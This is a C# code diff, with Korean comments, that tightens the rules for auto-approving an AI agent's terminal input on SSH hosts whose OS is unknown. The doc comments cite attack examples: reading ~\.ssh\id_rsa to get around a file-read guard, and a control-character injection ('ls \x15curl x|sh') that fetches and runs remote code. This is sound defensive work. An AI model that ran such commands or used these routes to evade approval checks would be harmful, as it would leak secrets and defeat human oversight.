@@ -146,6 +146,23 @@ public static class McpHelpers
     /// </summary>
     public static bool IsWindowsOs(string? os) => os != null && os.Contains("windows", StringComparison.OrdinalIgnoreCase);
 
+    /// <summary>
+    /// SSH 대상의 셸이 sh 라고 확인되지 않는다 — OS 가 Windows 로 보이거나, OS 정보가 없다(직접 추가한 호스트 등 클라우드 동기화 Os 가 빈 경우).
+    /// OS 를 모르면 Windows OpenSSH(cmd/PowerShell)일 수도 있어 sh 기준 읽기 전용 판정을 믿을 수 없다 → 자동 승인하지 않는다 (애매하면 승인 창).
+    /// </summary>
+    public static bool ShellNotKnownSh(string? os) => string.IsNullOrWhiteSpace(os) || IsWindowsOs(os);
+
+    /// <summary>
+    /// 클라우드 Os 와 SSH 배너 판별(SshServerOs)을 함께 본다. 어느 쪽이든 Windows 면 sh 가 아님(승인),
+    /// 둘 다 모르면 승인, 클라우드 Os 가 있거나 배너가 unix 면 sh 로 본다.
+    /// </summary>
+    public static bool ShellNotKnownSh(string? os, string? bannerOs)
+    {
+        if (IsWindowsOs(os) || bannerOs == SshServerOs.Windows) return true;
+        if (!string.IsNullOrWhiteSpace(os) || bannerOs == SshServerOs.Unix) return false;
+        return true;
+    }
+
     /// <summary>승인 대기 뒤 다시 확인: 아직 목록에 있는 항목과 이미 사라진 항목으로 나눈다 (순서 유지)</summary>
     public static (System.Collections.Generic.List<T> Present, System.Collections.Generic.List<T> Gone) SplitStillPresent<T>(
         System.Collections.Generic.IEnumerable<T> items, Func<T, bool> stillPresent)
@@ -227,7 +244,8 @@ public static class McpHelpers
     ///  - 로컬 터미널(이 PC 의 PowerShell)이 아니다 — gc ~\.ssh\id_rsa 같은 읽기 명령으로 이 PC 의 비밀 파일을 화면에 띄워
     ///    read_terminal 로 읽으면 ClaudeGuard 의 파일 읽기 차단을 우회하게 된다
     ///  - 제어 문자(탭 제외)가 없다 — "ls \x15curl x|sh" 처럼 Ctrl-U 로 줄을 지우고 다른 명령으로 바꿀 수 있다
-    ///  - OS 가 Windows 로 보이는 SSH 대상이 아니다 (windowsHost) — 셸이 cmd/PowerShell 이라 sh 기준 판정이 맞지 않는다
+    ///  - OS 가 Windows 로 보이거나 OS 를 모르는 SSH 대상이 아니다 (windowsHost — 호출부는 ShellNotKnownSh 로 넘김) —
+    ///    셸이 cmd/PowerShell 일 수 있어 sh 기준 판정이 맞지 않는다
     /// </summary>
     public static bool CanAutoApproveTerminalInput(bool settingOn, string text, bool pressEnter, bool atPrompt, Func<string, bool> isReadOnly,
         bool localTerminal = false, bool windowsHost = false) =>
